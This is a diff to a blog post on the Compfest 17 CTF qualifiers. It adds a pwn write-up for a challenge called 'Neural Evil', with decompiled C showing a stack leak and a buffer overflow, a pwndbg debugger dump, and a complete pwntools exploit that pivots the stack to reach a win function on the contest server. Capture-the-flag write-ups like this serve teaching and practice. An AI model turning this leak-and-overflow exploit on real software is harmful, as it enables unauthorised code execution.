@@ -1,5 +1,5 @@
 ---
-date: 2025-09-01 18:03:00
+date: 2025-09-02 18:03:00
 layout: post
 title: Compfest 17 Quals
 subtitle: Have fun at the national CTF
@@ -322,7 +322,6 @@ if __name__ == "__main__":
 Sure enough, this script creates files with the .enc extension, such as file.enc. After that, I created a decryption key from this script to open the .enc file that was found earlier.
 ### dec.py
 ```python
-└─$ cat dec.py
 import sys
 import hashlib
 import getpass
@@ -381,3 +380,149 @@ if __name__ == "__main__":
 Alhamdulillah, the zip password is the same as the password for decrypting this file.enc, until we get a cropped photo, so we need to make a few adjustments and get this photo.
 ![Gambar 5]({{ site.baseurl }}/assets/img/uploads/compfest17quals/flag.jpg)
 
+# Neural Evil (pwn)
+i solve this chall 1 day after the competition bcs i have a sick after competition :(
+## Description
+> What? Is this DnD? (p.s. the DM seems to be hiding something in his logs)
+
+## Initial Analysis
+![Gambar 6]({{ site.baseurl }}/assets/img/uploads/compfest17quals/6.png)
+no pie and canary on
+
+## Code Analysis
+```c
+void start(void)
+{
+  undefined local_28 [32];
+ 
+  printf("Cleric: what should we call you? ");
+  read(0,local_28,32);
+  printf("Everyone: welcome to our party %s",local_28);
+  encounter();
+  cleaner();
+  return;
+}
+```
+in function start we get the leak of stack because **printf("… %s", buf)** over-reads past buf until a NUL is encountered. The next bytes on the stack are start’s saved RBP
+and 
+```c
+void encounter(void)
+{
+  long unaff_retaddr;
+  char local_28 [32];
+ 
+  dm_secret = unaff_retaddr;
+  puts("DM: Your party stumbles upon an angry demigod.");
+  puts("DM: You have 10 seconds to do something that gets your party out alive");
+  printf("You do: ");
+  alarm(10);
+  fgets(local_28,80,stdin);
+  alarm(0);
+  if (unaff_retaddr != dm_secret) {
+    puts("DM: The god of nature swats you for disturbing the flow of nature");
+                    /* WARNING: Subroutine does not return */
+    exit(1);
+  }
+  return;
+}
+```
+In the ecounter function, there is a buffer overflow, but there is a check or custom check where the saved **RIP** must be a cleaner function.
+
+```bash
+Breakpoint 1, 0x0000000000401401 in encounter ()
+------- tip of the day (disable with set show-tips off) -------
+Use vmmap -A|-B <number> <filter> to display <number> of maps after/before filtered ones
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
+ RAX  0xa
+ RBX  0x7ffe01097f48 —▸ 0x7ffe01098d7c ◂— '/mnt/d/ctf/compfest17/quals/pwn/neutral_evil/chall'
+ RCX  0x7e7259d222b7 (alarm+7) ◂— cmp rax, -0xfff
+ RDX  0xfbad208b
+ RDI  0
+ RSI  0x7e7259e2c963 (_IO_2_1_stdin_+131) ◂— 0xe2e7c0000000000a /* '\n' */
+ R8   0
+ R9   0
+ R10  0
+ R11  0x202
+ R12  0
+ R13  0x7ffe01097f58 —▸ 0x7ffe01098daf ◂— 'SHELL=/bin/bash'
+ R14  0x7e7259e80000 (_rtld_global) —▸ 0x7e7259e81310 ◂— 0
+ R15  0x403df0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011d0 (__do_global_dtors_aux) ◂— endbr64
+ RBP  0x7ffe01097de0 —▸ 0x7ffe01097df0 ◂— 0x414141414141000a /* '\n' */
+ RSP  0x7ffe01097dc0 ◂— 0x4141414141414141 ('AAAAAAAA')
+ RIP  0x401401 (encounter+98) ◂— mov rax, qword ptr [rbp + 8]
+──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
+ ► 0x401401 <encounter+98>     mov    rax, qword ptr [rbp + 8]          RAX, [0x7ffe01097de8] => 0x401473 (start+72) ◂— call 0x401378
+   0x401405 <encounter+102>    mov    rdx, rax                          RDX => 0x401473 (start+72) ◂— call 0x401378
+   0x401408 <encounter+105>    mov    rax, qword ptr [rip + 0x2cc1]     RAX, [dm_secret] => 0x401473 (start+72) ◂— call 0x401378
+   0x40140f <encounter+112>    cmp    rdx, rax                          0x401473 - 0x401473     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
+   0x401412 <encounter+115>  ✔ je     encounter+137               <encounter+137>
+    ↓
+   0x401428 <encounter+137>    nop
+   0x401429 <encounter+138>    leave
+   0x40142a <encounter+139>    ret                                <start+72>
+    ↓
+   0x401473 <start+72>         call   cleaner                     <cleaner>
+
+b+ 0x401478 <start+77>         nop
+   0x401479 <start+78>         leave
+───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffe01097dc0 ◂— 0x4141414141414141 ('AAAAAAAA')
+... ↓        3 skipped
+04:0020│ rbp 0x7ffe01097de0 —▸ 0x7ffe01097df0 ◂— 0x414141414141000a /* '\n' */
+05:0028│+008 0x7ffe01097de8 —▸ 0x401473 (start+72) ◂— call cleaner
+06:0030│+010 0x7ffe01097df0 ◂— 0x414141414141000a /* '\n' */
+07:0038│+018 0x7ffe01097df8 ◂— 0x4141414141414141 ('AAAAAAAA')
+─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
+ ► 0         0x401401 encounter+98
+   1         0x401473 start+72
+   2 0x4141414141414141 None
+   3 0x4141414141414141 None
+   4 0x4141414141414141 None
+   5   0x7ffe01097e30 None
+   6         0x40149c main+33
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg>
+```
+final strategy is
+leak → compute pivot RBP (−0x40) → preserve encounter ret → plant ret; read_log → win...
+
+### solve.py
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+exe = context.binary = ELF(args.EXE or 'chall')
+context.terminal = ['wt.exe','wsl.exe']
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOT:
+        return remote('ctf.compfest.id',7004)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+break *0x401401
+break *0x401478
+continue
+'''.format(**locals())
+ 
+p = start()
+name = b'A'*32
+p.send(name)
+p.recvuntil(b'A'*32)
+leak = u64(p.recv(6).ljust(8,b'\x00')) - 0x40
+print(f'saved rbp leak @ {hex(leak)}')
+
+payload = b'A'*0x20
+payload += p64(leak)
+payload += p64(0x401473)
+payload += b'C'*0x8
+payload += p64(0x401016)
+payload += p64(0x401206)
+p.recvuntil(b'You do: ')
+p.sendline(payload)
+p.interactive()
+```
